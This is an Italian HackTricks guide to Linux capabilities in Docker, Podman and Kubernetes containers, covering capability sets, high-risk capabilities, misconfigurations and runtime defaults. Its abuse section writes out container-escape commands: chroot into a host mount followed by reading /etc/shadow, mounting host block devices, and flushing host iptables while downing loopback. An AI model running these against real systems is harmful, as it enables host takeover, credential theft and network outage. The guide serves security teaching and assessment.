# Linux Capabilities In Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

Le capabilities di Linux sono uno degli elementi più importanti della sicurezza dei container perché rispondono a una domanda sottile ma fondamentale: **che cosa significa davvero "root" all'interno di un container?** In un normale sistema Linux, storicamente l'UID 0 implicava un insieme di privilegi molto ampio. Nei kernel moderni, tale privilegio è suddiviso in unità più piccole chiamate capabilities. Un processo può essere eseguito come root e continuare a non disporre di molte operazioni potenti se le capabilities rilevanti sono state rimosse.

I container dipendono fortemente da questa distinzione. Molti workload vengono ancora avviati come UID 0 all'interno del container per ragioni di compatibilità o semplicità. Senza il dropping delle capabilities, ciò sarebbe molto pericoloso. Con il dropping delle capabilities, un processo root containerizzato può comunque eseguire molte attività ordinarie all'interno del container, mentre gli vengono negate operazioni più sensibili sul kernel. Per questo motivo, una shell del container che mostra `uid=0(root)` non significa automaticamente "root sull'host" e neppure "privilegi estesi sul kernel". I capability set determinano quanto valga realmente quell'identità root.

Per il riferimento completo alle capabilities di Linux e molti esempi di abuso, consulta:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Funzionamento

Le capabilities vengono tracciate in diversi set, inclusi permitted, effective, inheritable, ambient e bounding. Per molte valutazioni dei container, la semantica esatta del kernel di ciascun set è meno importante, nell'immediato, della domanda pratica finale: **quali operazioni privilegiate può eseguire con successo questo processo in questo momento e quali ulteriori acquisizioni di privilegi sono ancora possibili?**

Questo è importante perché molte tecniche di breakout sono in realtà problemi relativi alle capabilities mascherati da problemi dei container. Un workload con `CAP_SYS_ADMIN` può accedere a una quantità enorme di funzionalità del kernel che un normale processo root di un container non dovrebbe utilizzare. Un workload con `CAP_NET_ADMIN` diventa molto più pericoloso se condivide anche il network namespace dell'host. Un workload con `CAP_SYS_PTRACE` diventa molto più interessante se può vedere i processi dell'host tramite la condivisione del PID. In Docker o Podman ciò può apparire come `--pid=host`; in Kubernetes solitamente appare come `hostPID: true`.

In altre parole, il capability set non può essere valutato isolatamente. Deve essere analizzato insieme a namespaces, seccomp e policy MAC.

## Laboratorio

Un modo molto diretto per ispezionare le capabilities all'interno di un container è:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Puoi anche confrontare un container più restrittivo con uno a cui sono state aggiunte tutte le capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Per vedere l'effetto di un'aggiunta mirata, prova a rimuovere tutto e ad aggiungere nuovamente una sola capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Questi piccoli esperimenti aiutano a dimostrare che un runtime non si limita a impostare un booleano chiamato "privileged". Modella invece l'effettiva superficie dei privilegi disponibile al processo.

## Capabilities ad alto rischio

Sebbene molte capabilities possano essere importanti a seconda del target, alcune risultano ripetutamente rilevanti nell'analisi degli escape dai container.

**`CAP_SYS_ADMIN`** è quella che i defender dovrebbero considerare con maggiore sospetto. Viene spesso descritta come "il nuovo root" perché sblocca un'enorme quantità di funzionalità, incluse operazioni relative ai mount, comportamenti sensibili ai namespace e numerosi percorsi del kernel che non dovrebbero mai essere esposti casualmente ai container. Se un container dispone di `CAP_SYS_ADMIN`, seccomp debole e nessun forte confinamento MAC, molti percorsi classici di breakout diventano molto più realistici.

**`CAP_SYS_PTRACE`** è importante quando esiste visibilità sui processi, specialmente se il PID namespace è condiviso con l'host o con workload adiacenti interessanti. Può trasformare la visibilità in manomissione.

**`CAP_NET_ADMIN`** e **`CAP_NET_RAW`** sono importanti negli ambienti incentrati sulla rete. Su una rete bridge isolata possono essere già rischiose; su un network namespace condiviso con l'host sono molto peggiori, perché il workload potrebbe essere in grado di riconfigurare il networking dell'host, sniffare, effettuare spoofing o interferire con i flussi di traffico locali.

**`CAP_SYS_MODULE`** è solitamente catastrofica in un ambiente rootful, perché il caricamento dei kernel module equivale di fatto al controllo del kernel dell'host. Non dovrebbe quasi mai comparire in un workload container general-purpose.

## Utilizzo dei runtime

Docker, Podman, gli stack basati su containerd e CRI-O utilizzano tutti controlli sulle capabilities, ma i default e le interfacce di gestione differiscono. Docker le espone in modo molto diretto tramite flag come `--cap-drop` e `--cap-add`. Podman espone controlli simili e trae spesso vantaggio dall'esecuzione rootless come ulteriore livello di sicurezza. Kubernetes rende disponibili le aggiunte e le rimozioni di capabilities tramite il `securityContext` del Pod o del container. Anche gli ambienti system-container come LXC/Incus si basano sul controllo delle capabilities, ma la più ampia integrazione con l'host di questi sistemi induce spesso gli operatori a rilassare i default più aggressivamente di quanto farebbero in un ambiente app-container.

Lo stesso principio vale per tutti: una capability che è tecnicamente possibile concedere non è necessariamente una capability che dovrebbe essere concessa. Molti incidenti reali iniziano quando un operatore aggiunge una capability semplicemente perché un workload non funzionava con una configurazione più restrittiva e il team aveva bisogno di una soluzione rapida.

## Misconfigurazioni

L'errore più evidente è **`--cap-add=ALL`** nelle CLI in stile Docker/Podman, ma non è l'unico. In pratica, un problema più comune consiste nel concedere una o due capabilities estremamente potenti, soprattutto `CAP_SYS_ADMIN`, per "far funzionare l'applicazione", senza comprendere anche le implicazioni relative a namespace, seccomp e mount. Un altro comune failure mode consiste nel combinare capabilities aggiuntive con la condivisione dei namespace dell'host. In Docker o Podman questo può apparire come `--pid=host`, `--network=host` o `--userns=host`; in Kubernetes l'esposizione equivalente appare solitamente tramite impostazioni del workload come `hostPID: true` o `hostNetwork: true`. Ognuna di queste combinazioni modifica ciò che la capability può effettivamente influenzare.

È inoltre comune vedere amministratori convinti che, poiché un workload non è completamente `--privileged`, sia ancora significativamente vincolato. A volte è vero, ma in altri casi il security posture effettivo è già abbastanza vicino a quello privilegiato da rendere irrilevante, dal punto di vista operativo, la distinzione.

## Abuse

Il primo passaggio pratico consiste nell'enumerare l'insieme effettivo delle capabilities e testare immediatamente le azioni specifiche per capability che potrebbero essere rilevanti per un escape o per l'accesso alle informazioni dell'host:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Se `CAP_SYS_ADMIN` è presente, testa prima gli abusi basati su mount e l'accesso al filesystem dell'host, perché questo è uno dei più comuni facilitatori di breakout:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Se `CAP_SYS_PTRACE` è presente e il container può vedere processi interessanti, verifica se la capability può essere trasformata in ispezione dei processi:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Se `CAP_NET_ADMIN` o `CAP_NET_RAW` è presente, verifica se il workload può manipolare lo stack di rete visibile o almeno raccogliere informazioni utili sulla rete:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Quando un test di capability ha esito positivo, combinalo con la situazione dei namespace. Una capability che in un namespace isolato sembra solamente rischiosa può diventare immediatamente un primitive di escape o di host-recon quando il container condivide anche il PID dell'host, la rete dell'host o i mount dell'host.

### Esempio completo: `CAP_SYS_ADMIN` + mount dell'host = Host Escape

Se il container dispone di `CAP_SYS_ADMIN` e di un bind mount scrivibile del filesystem dell'host, come `/host`, il percorso di escape è spesso semplice:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Se `chroot` ha esito positivo, i comandi vengono ora eseguiti nel contesto del filesystem root dell'host:
```bash
id
hostname
cat /etc/shadow | head
```
Se `chroot` non è disponibile, lo stesso risultato può spesso essere ottenuto chiamando il binario attraverso l'albero montato:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Esempio completo: `CAP_SYS_ADMIN` + Accesso ai dispositivi

Se un dispositivo a blocchi dell'host è esposto, `CAP_SYS_ADMIN` può trasformarlo in un accesso diretto al filesystem dell'host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Esempio completo: `CAP_NET_ADMIN` + Host Networking

Questa combinazione non produce sempre direttamente host root, ma può riconfigurare completamente lo stack di rete dell'host:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Ciò può consentire denial of service, intercettazione del traffico o l'accesso a servizi che in precedenza erano filtrati.

## Controlli

L'obiettivo dei controlli delle capability non è solo estrarre valori grezzi, ma comprendere se il processo dispone di privilegi sufficienti affinché il suo namespace corrente e la situazione dei mount risultino pericolosi.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Cosa è interessante qui:

- `capsh --print` è il modo più semplice per individuare capability ad alto rischio come `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` o `cap_sys_module`.
- La riga `CapEff` in `/proc/self/status` indica cosa è effettivamente attivo ora, non solo cosa potrebbe essere disponibile in altri set.
- Un dump delle capability diventa molto più importante se il container condivide anche i namespace PID, network o user dell'host, oppure dispone di mount dell'host scrivibili.

Dopo aver raccolto le informazioni grezze sulle capability, il passo successivo è l'interpretazione. Verifica se il processo è root, se i user namespaces sono attivi, se i namespace dell'host sono condivisi, se seccomp è in modalità enforcing e se AppArmor o SELinux limitano ancora il processo. Un set di capability, da solo, rappresenta solo una parte del contesto, ma spesso è proprio ciò che spiega perché un container breakout funziona mentre un altro fallisce partendo dalla stessa situazione apparente.

## Runtime Defaults

| Runtime / platform | Stato predefinito | Comportamento predefinito | Indebolimento manuale comune |
| --- | --- | --- | --- |
| Docker Engine | Set di capability ridotto per impostazione predefinita | Docker mantiene una allowlist predefinita di capability e rimuove le altre | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Set di capability ridotto per impostazione predefinita | I container Podman sono unprivileged per impostazione predefinita e utilizzano un modello di capability ridotto | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Eredita i runtime defaults salvo modifiche | Se non viene specificato alcun `securityContext.capabilities`, il container riceve il set di capability predefinito dal runtime | `securityContext.capabilities.add`, non eseguire `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Solitamente runtime default | Il set effettivo dipende dal runtime e dal Pod spec | come nella riga Kubernetes; anche la configurazione OCI/CRI diretta può aggiungere esplicitamente capability |

Per Kubernetes, il punto importante è che l'API non definisce un unico set universale di capability predefinite. Se il Pod non aggiunge o rimuove capability, il workload eredita il runtime default del nodo.

{{#include ../../../../banners/hacktricks-training.md}}
